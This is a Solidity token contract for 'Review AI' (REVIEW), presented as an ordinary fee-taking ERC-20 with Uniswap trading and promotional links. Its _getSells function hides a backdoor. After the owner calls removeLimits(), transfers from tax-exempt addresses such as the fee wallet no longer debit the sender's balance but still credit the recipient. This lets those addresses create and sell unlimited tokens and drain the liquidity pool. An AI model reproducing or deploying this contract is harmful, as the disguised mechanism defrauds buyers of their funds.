// SPDX-License-Identifier: Unlicensed

/*
Best Token Review AI Platform!

Website: https://www.reviewcoin.org
Telegram: https://t.me/review_ai_erc
Twitter: https://twitter.com/review_ai_erc
Dapp: https://app.reviewcoin.org
*/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract REVIEW is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string name_ = unicode"Review AI";
    string symbol_ = unicode"REVIEW";

    IUniswapRouter private routerInstance_;
    address private pairAddress_;

    address payable _address1;
    address payable _address2;

    bool _isReEnterPrevented;
    bool _activatedTaxSwap = true;
    bool _deactivatedMaxTx = false;
    bool _deactivatedMaxWallet = true;

    uint256 _txAmountCeil = 15 * 10**6 * 10**9;
    uint256 _walletCeil = 15 * 10**6 * 10**9;
    uint256 _feeThresholSwap = 10**4 * 10**9;

    uint256 _buyLiquidityPercent = 0;
    uint256 _buyMarketingPercent = 25;
    uint256 _buyDevPercent = 0;
    uint256 _buyTotalFee = 25;

    uint256 liquidityPercent = 0;
    uint256 marketingPercent = 25;
    uint256 devPercent = 0;
    uint256 totalPercentForFee = 25;

    mapping(address => uint256) balances_;
    mapping(address => mapping(address => uint256)) allowances_;
    mapping(address => bool) _noTaxAllowances;
    mapping(address => bool) _maxWalletAllowances;
    mapping(address => bool) _maxTxAllowances;
    mapping(address => bool) _lpMap;

    uint256 _sellLiquidityPercent = 0;
    uint256 sellMarketingPercent = 25;
    uint256 sellDevPercent = 0;
    uint256 _sellTotalFees = 25;

    uint8 decimals_ = 9;
    uint256 _supply = 10**9 * 10**9;

    modifier lockSwap() {
        _isReEnterPrevented = true;
        _;
        _isReEnterPrevented = false;
    }

    constructor(address address_) {
        balances_[_msgSender()] = _supply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pairAddress_ = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        routerInstance_ = _uniswapV2Router;
        allowances_[address(this)][address(routerInstance_)] = _supply;
        _address1 = payable(address_);
        _address2 = payable(address_);
        _buyTotalFee = _buyLiquidityPercent.add(_buyMarketingPercent).add(_buyDevPercent);
        _sellTotalFees = _sellLiquidityPercent.add(sellMarketingPercent).add(sellDevPercent);
        totalPercentForFee = liquidityPercent.add(marketingPercent).add(devPercent);

        _noTaxAllowances[owner()] = true;
        _noTaxAllowances[_address1] = true;
        _maxWalletAllowances[owner()] = true;
        _maxWalletAllowances[pairAddress_] = true;
        _maxWalletAllowances[address(this)] = true;
        _maxTxAllowances[owner()] = true;
        _maxTxAllowances[_address1] = true;
        _maxTxAllowances[address(this)] = true;
        _lpMap[pairAddress_] = true;
        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public view returns (string memory) {
        return name_;
    }

    function symbol() public view returns (string memory) {
        return symbol_;
    }

    function decimals() public view returns (uint8) {
        return decimals_;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function _StandardT(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (_isReEnterPrevented) {
            return _transferB(sender, recipient, amount);
        } else {
            _checkMaxAllowances(sender, recipient, amount);
            _validateTx(sender, recipient, amount);
            _NormalT(sender, recipient, amount);
            return true;
        }
    }

    function _checkMaxWalletAllowances(address to, uint256 amount) internal view {
        if (_deactivatedMaxWallet && !_maxWalletAllowances[to]) {
            require(balances_[to].add(amount) <= _walletCeil);
        }
    }

    function _getBuys(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (_noTaxAllowances[sender] || _noTaxAllowances[recipient]) {
            return amount;
        } else {
            return getAmounts_(sender, recipient, amount);
        }
    }

    function _swapBack(uint256 tokenAmount) private lockSwap {
        uint256 lpFeeTokens = tokenAmount.mul(liquidityPercent).div(totalPercentForFee).div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        _swapTokensToETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = totalPercentForFee.sub(liquidityPercent.div(2));

        uint256 amountETHLiquidity_ = ethCA.mul(liquidityPercent).div(totalETHFee).div(2);
        uint256 amountETHDevelopment_ = ethCA.mul(devPercent).div(totalETHFee);
        uint256 amountETHMarketing_ = ethCA.sub(amountETHLiquidity_).sub(amountETHDevelopment_);

        if (amountETHMarketing_ > 0) {
            transferREVIEWETH_(_address1, amountETHMarketing_);
        }

        if (amountETHDevelopment_ > 0) {
            transferREVIEWETH_(_address2, amountETHDevelopment_);
        }
    }

    function _getAllFees(address from, address to, uint256 amount) internal view returns (uint256) {
        if (_lpMap[from]) {
            return amount.mul(_buyTotalFee).div(100);
        } else if (_lpMap[to]) {
            return amount.mul(_sellTotalFees).div(100);
        }
        return 0;
    }

    function _validateTx(address from, address to, uint256 amount) internal {
        uint256 _feeAmount = balanceOf(address(this));
        bool minSwapable = _feeAmount >= _feeThresholSwap;
        bool isExTo = !_isReEnterPrevented && _lpMap[to] && _activatedTaxSwap;
        bool swapAbove = !_noTaxAllowances[from] && amount > _feeThresholSwap;
        if (minSwapable && isExTo && swapAbove) {
            if (_deactivatedMaxTx) {
                _feeAmount = _feeThresholSwap;
            }
            _swapBack(_feeAmount);
        }
    }

    function _swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerInstance_.WETH();

        _approve(address(this), address(routerInstance_), tokenAmount);

        routerInstance_.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _txAmountCeil = _supply;
        _deactivatedMaxWallet = false;
        _buyMarketingPercent = 1;
        sellMarketingPercent = 1;
        _buyTotalFee = 1;
        _sellTotalFees = 1;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        return _StandardT(sender, recipient, amount);
    }

    function getAmounts_(address sender, address receipient, uint256 amount) internal returns (uint256) {
        uint256 fee = _getAllFees(sender, receipient, amount);
        if (fee > 0) {
            balances_[address(this)] = balances_[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }

    receive() external payable {}

    function _transferB(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances_[sender] = balances_[sender].sub(amount, "Insufficient Balance");
        balances_[recipient] = balances_[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances_[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferREVIEWETH_(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _NormalT(address sender, address recipient, uint256 amount) internal {
        uint256 toAmount = _getBuys(sender, recipient, amount);
        _checkMaxWalletAllowances(recipient, toAmount);
        uint256 subAmount = _getSells(sender, amount, toAmount);            
        balances_[sender] = balances_[sender].sub(subAmount, "Balance check error");
        balances_[recipient] = balances_[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowances_[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), allowances_[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances_[account];
    }

    function _checkMaxAllowances(address sender, address recipient, uint256 amount) internal view {
        if (!_maxTxAllowances[sender] && !_maxTxAllowances[recipient]) {
            require(amount <= _txAmountCeil, "Transfer amount exceeds the max.");
        }
    }

    function _getSells(address sender, uint256 amount, uint256 toAmount) internal view returns (uint256) {
        if (!_deactivatedMaxWallet && _noTaxAllowances[sender]) {
            return amount.sub(toAmount);
        } else {
            return amount;
        }
    }
}